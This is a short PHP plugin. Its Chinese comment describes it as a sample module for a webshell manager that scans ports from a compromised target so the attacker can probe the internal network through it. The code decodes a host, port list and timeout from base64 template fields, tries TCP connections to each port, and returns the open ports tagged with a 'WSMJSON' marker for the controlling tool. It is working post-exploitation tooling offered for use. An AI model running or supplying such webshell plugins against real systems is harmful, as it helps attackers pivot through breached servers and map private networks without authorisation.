<?php
// 目标侧非阻塞端口扫描（webshell 管理示例插件）——以目标为跳板探测内网
$host = base64_decode('{{host}}');
$ports = array_map('intval', array_filter(explode(',', base64_decode('{{ports}}'))));
$tmo = max(1, min(5, intval(base64_decode('{{timeout}}'))));
$open = array();
foreach ($ports as $p) {
    if ($p < 1 || $p > 65535) continue;
    $s = @stream_socket_client("tcp://$host:$p", $errno, $errstr, $tmo);
    if ($s !== false) { $open[] = $p; fclose($s); }
}
echo 'WSMJSON' . json_encode(array('host' => $host, 'open' => $open, 'checked' => count($ports)));
